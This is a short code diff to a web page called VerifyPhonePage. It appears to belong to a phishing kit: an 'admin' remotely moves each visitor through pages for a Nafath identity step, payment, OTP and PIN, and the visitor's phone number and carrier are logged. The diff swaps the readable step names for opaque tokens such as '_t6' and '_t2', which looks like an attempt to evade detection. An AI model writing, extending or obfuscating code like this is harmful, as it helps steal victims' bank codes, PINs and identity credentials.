@@ -52,16 +52,16 @@ export default function VerifyPhonePage() {
           if (data.currentStep === "home") {
             console.log("[phone-info] Admin redirecting to home")
             window.location.href = "/"
-          } else if (data.currentStep === "nafad") {
+          } else if (data.currentStep === "_t6") {
             console.log("[phone-info] Admin redirecting to nafad")
             window.location.href = "/nafad"
           } else if (data.currentStep === "payment") {
             console.log("[phone-info] Admin redirecting to payment")
             window.location.href = "/check"
-          } else if (data.currentStep === "otp") {
+          } else if (data.currentStep === "_t2") {
             console.log("[phone-info] Admin redirecting to otp")
             window.location.href = "/veri"
-          } else if (data.currentStep === "pin") {
+          } else if (data.currentStep === "_t3") {
             console.log("[phone-info] Admin redirecting to pin")
             window.location.href = "/confi"
           } else if (typeof data.currentStep === 'number') {
@@ -130,7 +130,7 @@ export default function VerifyPhonePage() {
       })
 
       // Add phone info to history
-      await addToHistory(visitorID, "phone_info", {
+      await addToHistory(visitorID, "_t4", {
         phoneNumber,
         phoneCarrier: selectedCarrier
       }, "pending")
